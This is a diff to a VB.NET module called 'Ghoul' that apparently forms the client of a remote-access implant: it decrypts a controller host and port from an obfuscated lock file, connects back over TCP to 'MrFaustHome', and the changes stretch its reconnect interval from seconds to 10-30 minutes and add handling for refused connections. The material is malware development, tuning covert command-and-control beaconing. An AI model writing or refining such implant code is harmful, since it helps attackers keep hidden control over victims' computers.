@@ -7,8 +7,8 @@ Imports System.Net.Sockets
 Module Ghoul
 
     Const BUFFER_SIZE As Integer = 1024
-    Const RECONNECT_MIN As Integer = 2
-    Const RECONNECT_MAX As Integer = 10
+    Const RECONNECT_MIN As Integer = 60 * 10
+    Const RECONNECT_MAX As Integer = 60 * 30
     Const LOCK_FILE As String = "tOlYLguYQMM="
 
     Dim Ghoul As New TcpClient
@@ -23,6 +23,7 @@ Module Ghoul
 #Region "ERRORS"
     Const NO_CONNECTION As String = "No connection could be made because the target machine"
     Const DISPOSED_ISSUE As String = "Cannot access a disposed object"
+    Const CONNECT_ATTEMPT As String = "A connection attempt failed because the connected party did not properly respond"
 #End Region
 
     Sub GhoulConnect()
@@ -35,9 +36,9 @@ Module Ghoul
                     line = reader.ReadLine
                 End Using
 
-                If line.Length = 0 Then
-                    Ghoul = New TcpClient
-                    Ghoul.Connect(MrFaustHome, MrFaustEntrance)
+                If line Is Nothing Then
+                    DontConnect()
+                    Exit Sub
                 ElseIf line.Substring(0, 1) = ":" Then
                     Dim newHome As String, newDoor As String
                     newHome = DecryptString(line.Substring(1)).Split(":")(0)
@@ -45,7 +46,11 @@ Module Ghoul
 
                     Ghoul = New TcpClient
                     Ghoul.Connect(newHome, newDoor)
+                ElseIf line.Length > 0 Then
+                    DontConnect()
+                    Exit Sub
                 Else
+                    DontConnect()
                     Exit Sub
                 End If
             Else
@@ -64,6 +69,8 @@ Module Ghoul
                 ClientLog("Mr Faust is not yet home...")
             ElseIf ex.ToString.Contains(DISPOSED_ISSUE) Then
                 ClientLog("No object, no dispose")
+            ElseIf ex.ToString.Contains(CONNECT_ATTEMPT) Then
+                ClientLog("It looks like... Different...")
             Else
                 ClientLog(ex.ToString)
                 Die()
@@ -73,6 +80,10 @@ Module Ghoul
 
             startTimer()
         End Try
+    End Sub
+
+    Private Sub DontConnect()
+        rc_timer.Enabled = False
     End Sub
 
     Private Sub startTimer()
